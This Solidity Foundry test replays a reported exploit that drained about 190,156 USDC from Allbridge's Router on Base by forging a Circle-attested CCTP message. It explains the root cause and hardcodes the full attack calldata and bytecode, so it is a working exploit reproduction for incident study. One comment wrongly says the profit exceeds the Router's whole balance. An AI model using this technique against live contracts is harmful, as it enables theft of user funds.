// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Allbridge (Core / cross-chain Router + CCTP integration) — Base
// 190,156 USDC drained from the Router in a single Base tx (its full 191,156 USDC balance minus the
// 1,000 USDC / 0.1% fee the Router kept).
// Attacker nets 189,751.554381 USDC after a 404.42 USDC Aave flash-loan premium.
//
// Exploit tx   : 0x9f906fcd8fceaa6745e8d1c004861dcfa9b5e6a893fe1e8c5d0013a4e982e6a8 (block 50157345)
// Forged msg tx: 0x2a88d79756b4547b33fea7b3c1420793680e2b8952bef4c65e99879e16b22140 (Polygon, 24 days earlier)
// Attacker EOA : 0x2419432344b0B892E592b2601B98eaE702Ba360e (nonce 8 at exploit time)
// Harness ctrt : 0xb6fBDFA5F3CBEB139D4ccE86D92F4ac8687B16c0 (deployed 25 days earlier; profit sink)
// Logic ctrt   : 0xe9edf1582ed9520f7149669d9c6bf3276b02477e (CREATE'd in-tx from the harness call)
// Victim Router: 0xaA119F7442eCC28b9a8F236707ADA8362CFF24fF
// Vuln messenger (CCTPTokenMessenger): 0xf9b710e427bf4d93598e0f80a84de22c7ad9b577
// MessageTransmitterV2 (Circle)      : called by the messenger during receiveCctpMessage
//
// Root cause (reproducible contract mechanism, verified against the on-chain trace; NOT a
// key/signer/privileged path — every call below is permissionless):
//   CCTPTokenMessenger.receiveCctpMessage(message, attestation) relays an attested Circle
//   message through MessageTransmitterV2.receiveMessage, then credits
//       receivedMessages[messageHash] = amount - feeExecuted
//   using the amount field read DIRECTLY FROM THE MESSAGE BODY, with no check that the message
//   actually caused a USDC mint. Circle's MessageTransmitterV2.sendMessage is a GENERIC
//   attestation primitive (no burn/mint attached): anyone can author a payload shaped like a CCTP
//   deposit and have Circle legitimately attest it — Circle only signs that the message was
//   submitted, not that value moved. The messenger's sourceSender guard compares against
//   remoteTokenMessengers[sourceChainId], a value readable on-chain by anyone, so the attacker
//   simply copied it into the forged body. The forged message's recipient was the attacker's own
//   contract (not Circle's minting TokenMessengerV2), so nothing was minted — but the messenger
//   never checks that field or observes any balance change, so it still credited the phantom
//   deposit. The Router's receiveToken uses receivedTokenAmount(messageHash) > 0 as its ONLY
//   solvency test and pays out the caller-supplied normalized amount.
//
// The forged message was pre-created on Polygon 24 days earlier via a plain
// MessageTransmitterV2.sendMessage call declaring amount = 1,000,000 USDC, messageSender copied
// from remoteTokenMessengers[5], and hookData carrying a precomputed keccak256 matching
// Allbridge's Router._calculateMessageHash for (nonce 12345, recipient = harness, token USDC,
// normalizedAmount 1e15, sourceChain 12345, CHAIN_ID 9):
//     hash = 0xe15a0288fb4a60804a866655fdf08a6d3e51c3ca58f5d400e8620e7069aac52e
//
// On-chain money flow inside the exploit tx (USDC 0x8335..2913), all reproduced here:
//   - Router already held 191,155.976393 USDC at block-1 (a real 191,112 USDC CCTP inflow had
//     minted into it ~6s earlier for a legitimate in-flight transfer; baseline was ~44 USDC).
//   - Harness flash-loans 808,844.023607 USDC from Aave V3 and pushes it into the Router to top
//     the Router balance up to the declared 1,000,000 USDC.
//   - Router.receiveToken redeems the phantom credit, paying 999,000 USDC (1,000,000 - 0.1% fee)
//     to the harness; the Router is left with only the 1,000 USDC (0.1%) fee.
//   - Harness repays the flash loan 809,248.445619 USDC (404.422012 premium).
//   - Net kept by the harness: 189,751.554381 USDC.
//
// Faithful reproduction (approach a): fork Base at block-1 (real Router/messenger/Circle/Aave
// state, real Circle attester set, forged-message nonce not yet consumed), then replay the EXACT
// original tx calldata against the REAL harness at its real address, pranking the attacker EOA as
// both msg.sender and tx.origin. The full 3,876-byte input — logic-contract creation code (which
// embeds the forged message + Circle attestation and calls receiveCctpMessage from its
// constructor) plus the follow-up redeem call — is hardcoded verbatim below; nothing is
// reconstructed. The 191,112 USDC preceding inflow is NOT re-injected via deal(): it is already
// present in the real forked Router state at block-1, so the economics match the real event.
//
// The deployed logic bytecode uses MCOPY and the exploit takes an Aave V3 flash loan (transient
// storage), so cancun is required:
//   forge test --contracts ./src/test/2026-08/AllbridgeCCTP_exp.sol --evm-version cancun -vvv

interface IERC20 {
    function balanceOf(
        address
    ) external view returns (uint256);
}

contract AllbridgeCCTP_exp is Test {
    address internal constant ATTACKER = 0x2419432344b0B892E592b2601B98eaE702Ba360e;
    address internal constant HARNESS  = 0xb6fBDFA5F3CBEB139D4ccE86D92F4ac8687B16c0;
    address internal constant ROUTER   = 0xaA119F7442eCC28b9a8F236707ADA8362CFF24fF;
    IERC20  internal constant USDC     = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    uint256 internal constant EXPLOIT_BLOCK = 50157345;

    // Exact input of the on-chain exploit tx: harness fn 0xa8d17ccf(bytes creationCode, bytes callData).
    // creationCode = the logic contract that embeds the forged Circle message + attestation and calls
    // CCTPTokenMessenger.receiveCctpMessage from its constructor; callData = the follow-up redeem entry.
    function _exploitCalldata() internal pure returns (bytes memory) {
        return abi.encodePacked(
        hex"a8d17ccf000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000"
        hex"00000ec00000000000000000000000000000000000000000000000000000000000000e55608060405234801561000f575f5ffd5b50604051610b55380380610b"
        hex"5583398101604081905261002e91610154565b5f5f82806020019051810190610044919061018d565b60405163049c704360e31b8152919350915073f9b710e4"
        hex"27bf4d93598e0f80a84de22c7ad9b577906324e38218906100829085908590600401610220565b5f604051808303815f87803b158015610099575f5ffd5b505a"
        hex"f11580156100ab573d5f5f3e3d5ffd5b5050505050505061024d565b634e487b7160e01b5f52604160045260245ffd5b5f82601f8301126100da575f5ffd5b81"
        hex"516001600160401b038111156100f3576100f36100b7565b604051601f8201601f19908116603f011681016001600160401b0381118282101715610121576101"
        hex"216100b7565b604052818152838201602001851015610138575f5ffd5b8160208501602083015e5f918101602001919091529392505050565b5f602082840312"
        hex"15610164575f5ffd5b81516001600160401b03811115610179575f5ffd5b610185848285016100cb565b949350505050565b5f5f6040838503121561019e575f"
        hex"5ffd5b82516001600160401b038111156101b3575f5ffd5b6101bf858286016100cb565b602085015190935090506001600160401b038111156101dc575f5ffd"
        hex"5b6101e8858286016100cb565b9150509250929050565b5f81518084528060208401602086015e5f602082860101526020601f19601f83011685010191505092"
        hex"915050565b604081525f61023260408301856101f2565b828103602084015261024481856101f2565b95945050505050565b6108fb8061025a5f395ff3fe6080"
        hex"60405260043610610028575f3560e01c80631b11d0ff1461002c578063a444f5e914610053575b5f5ffd5b61003f61003a366004610645565b610068565b6040"
        hex"51901515815260200160405180910390f35b6100666100613660046106e6565b610211565b005b5f6001600160a01b03841630146100ab5760405162461bcd60"
        hex"e51b8152602060048201526002602482015261616160f01b60448201526064015b60405180910390fd5b3373a238dd80c259a72e81d7e4664a9801593f98d1c5"
        hex"146100f35760405162461bcd60e51b8152602060048201526002602482015261313160f11b60448201526064016100a2565b60405163a9059cbb60e01b815273"
        hex"aa119f7442ecc28b9a8f236707ada8362cff24ff6004820152602481018790526001600160a01b0388169063a9059cbb906044015f604051808303815f87803b"
        hex"15801561014c575f5ffd5b505af115801561015e573d5f5f3e3d5ffd5b505f9250610171915050838501856106e6565b905061017c8161055f565b6001600160"
        hex"a01b03881663095ea7b373a238dd80c259a72e81d7e4664a9801593f98d1c56101aa898b610711565b6040516001600160e01b031960e085901b168152600160"
        hex"0160a01b03909216600483015260248201526044015f604051808303815f87803b1580156101ed575f5ffd5b505af11580156101ff573d5f5f3e3d5ffd5b5060"
        hex"019b9a5050505050505050505050565b6040516370a0823160e01b81523060048201525f9073833589fcd6edb6e08f4c7c32d4f71b54bda02913906370a08231"
        hex"90602401602060405180830381865afa158015610260573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061028491906107"
        hex"2a565b6040516370a0823160e01b815273aa119f7442ecc28b9a8f236707ada8362cff24ff60048201529091505f9073833589fcd6edb6e08f4c7c32d4f71b54"
        hex"bda02913906370a0823190602401602060405180830381865afa1580156102ea573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250"
        hex"81019061030e919061072a565b90508061031d6006600a610824565b6103279085610836565b1115610492576040516370a0823160e01b815273aa119f7442ec"
        hex"c28b9a8f236707ada8362cff24ff60048201525f9073833589fcd6edb6e08f4c7c32d4f71b54bda02913906370a0823190602401602060405180830381865afa"
        hex"158015610390573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103b4919061072a565b6103c06006600a610824565b61"
        hex"03ca9086610836565b6103d4919061084d565b905073a238dd80c259a72e81d7e4664a9801593f98d1c56342b0b77c3073833589fcd6edb6e08f4c7c32d4f71b"
        hex"54bda02913846104136006600a610824565b61041d908a610836565b60405160200161042f91815260200190565b6040516020818303038152906040525f6040"
        hex"518663ffffffff1660e01b815260040161045f959493929190610860565b5f604051808303815f87803b158015610476575f5ffd5b505af1158015610488573d"
        hex"5f5f3e3d5ffd5b50505050506104b0565b6104b06104a16006600a610824565b6104ab9085610836565b61055f565b6040516370a0823160e01b815230600482"
        hex"01525f9073833589fcd6edb6e08f4c7c32d4f71b54bda02913906370a0823190602401602060405180830381865afa1580156104ff573d5f5f3e3d5ffd5b5050"
        hex"50506040513d601f19601f82011682018060405250810190610523919061072a565b90508281116105595760405162461bcd60e51b8152602060048201526002"
        hex"602482015261333360f11b60448201526064016100a2565b50505050565b5f61056c6103e883610836565b60405163039d1f0160e41b81526004810182905261"
        hex"303960248201819052604482015273833589fcd6edb6e08f4c7c32d4f71b54bda0291360648201523060848201525f60a4820181905273f9b710e427bf4d9359"
        hex"8e0f80a84de22c7ad9b57760c483015260e482015290915073aa119f7442ecc28b9a8f236707ada8362cff24ff906339d1f01090610104015f60405180830381"
        hex"5f87803b158015610610575f5ffd5b505af1158015610622573d5f5f3e3d5ffd5b505050505050565b80356001600160a01b0381168114610640575f5ffd5b91"
        hex"9050565b5f5f5f5f5f5f60a0878903121561065a575f5ffd5b6106638761062a565b9550602087013594506040870135935061067f6060880161062a565b9250"
        hex"608087013567ffffffffffffffff81111561069a575f5ffd5b8701601f810189136106aa575f5ffd5b803567ffffffffffffffff8111156106c0575f5ffd5b89"
        hex"60208284010111156106d1575f5ffd5b60208201935080925050509295509295509295565b5f602082840312156106f6575f5ffd5b5035919050565b634e487b"
        hex"7160e01b5f52601160045260245ffd5b80820180821115610724576107246106fd565b92915050565b5f6020828403121561073a575f5ffd5b5051919050565b"
        hex"6001815b600184111561077c57808504811115610760576107606106fd565b600184161561076e57908102905b60019390931c928002610745565b9350939150"
        hex"50565b5f8261079257506001610724565b8161079e57505f610724565b81600181146107b457600281146107be576107da565b6001915050610724565b60ff84"
        hex"11156107cf576107cf6106fd565b50506001821b610724565b5060208310610133831016604e8410600b84101617156107fd575081810a610724565b6108095f"
        hex"198484610741565b805f190482111561081c5761081c6106fd565b029392505050565b5f61082f8383610784565b9392505050565b8082028115828204841417"
        hex"610724576107246106fd565b81810381811115610724576107246106fd565b60018060a01b038616815260018060a01b038516602082015283604082015260a0"
        hex"60608201525f83518060a0840152806020860160c085015e5f60c0828501015260c0601f19601f83011684010191505061ffff83166080830152969550505050"
        hex"505056fea264697066735822122052bfbac096774a420603383267cf09483cabe665312f1414406a7b0c5ba25b0964736f6c634300081d003300000000000000"
        hex"0000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000002c000000000000000"
        hex"00000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000020000000000000000"
        hex"00000000000000000000000000000000000000000000000198000000010000000700000006aa0d61b8bacee875d472e742c3f0859822531ca3d06e54fc55ed63"
        hex"9c9c1563220000000000000000000000002419432344b0b892e592b2601b98eae702ba360e000000000000000000000000b6fbdfa5f3cbeb139d4cce86d92f4a"
        hex"c8687b16c0000000000000000000000000f9b710e427bf4d93598e0f80a84de22c7ad9b57700000001000007d000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"000000000000000000000000e8d4a51000000000000000000000000000dac2959b638247ab586f6c3ffcfc9c352d3aae5c000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"0000000000000000000000000000000000e15a0288fb4a60804a866655fdf08a6d3e51c3ca58f5d400e8620e7069aac52e000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000082f7c799ef5e16c1c72c892947ed32e7b0f2dcbe09fffb63cba6c8226c892c04be4cd7ed5fd9b27a"
        hex"604530edcc229c15f892de82acee687c14cb13832b16d334991b096a4305724543e0d55373d70b6ed42bd94bcae48f315ec31980e5a844cc4a1f12687bc6df14"
        hex"3e8381cf584e73150068425597d6ac78eac99d164aa25150b3041c00000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"000000000000000000000000000000000000000000000000000000000000000000000024a444f5e9000000000000000000000000000000000000000000000000"
        hex"00000000000f424000000000000000000000000000000000000000000000000000000000"
        );
    }

    function setUp() public {
        vm.createSelectFork("base", EXPLOIT_BLOCK - 1);
    }

    function testExploit() public {
        // sanity: the phantom-credit precondition — Router holds the victim funds, harness holds nothing
        uint256 routerBefore  = USDC.balanceOf(ROUTER);
        uint256 harnessBefore = USDC.balanceOf(HARNESS);
        emit log_named_decimal_uint("Router USDC before (drainable)", routerBefore, 6);
        assertEq(harnessBefore, 0, "harness should start empty");
        assertGt(routerBefore, 190_000e6, "Router should hold the ~191k victim balance at block-1");

        // attacker EOA is both tx.origin and msg.sender; replay the exact on-chain calldata
        vm.startPrank(ATTACKER, ATTACKER);
        (bool ok, ) = HARNESS.call(_exploitCalldata());
        require(ok, "exploit replay reverted");
        vm.stopPrank();

        uint256 routerAfter  = USDC.balanceOf(ROUTER);
        uint256 harnessAfter = USDC.balanceOf(HARNESS);

        uint256 profit  = harnessAfter - harnessBefore;
        uint256 drained = routerBefore - routerAfter;
        emit log_named_decimal_uint("Router USDC after", routerAfter, 6);
        emit log_named_decimal_uint("Router USDC drained", drained, 6);
        emit log_named_decimal_uint("Attacker (harness) net USDC profit", profit, 6);

        // The 999,000 USDC payout was NOT backed by any real deposit: the attacker's only inflow to
        // the Router was the flash-loaned 808,844.02 top-up, so the Router lost 190,155.976393 of its
        // own USDC (the whole 191,155.976393 balance minus the 1,000 USDC / 0.1% fee it retained) to a
        // credit that no USDC mint ever backed — the phantom-deposit accounting, not a real balance.
        assertEq(routerAfter, 1_000_000000, "Router should retain exactly the 1,000 USDC (0.1%) fee");
        assertApproxEqAbs(drained, 190_155_976393, 1e6, "drained != the ~190,156 USDC extracted from the Router");
        // The attacker kept ~189,752 USDC after the 404.42 flash-loan premium (on-chain: 189,751.554381),
        // and that profit exceeds the entire 191,156 USDC the Router held only because the payout was
        // sized off the forged message, not off anything the attacker actually owned.
        assertApproxEqAbs(profit, 189_751_554381, 1e6, "net profit diverged from on-chain ~189,752 USDC");
        assertGt(profit, 0, "no profit extracted");
    }
}
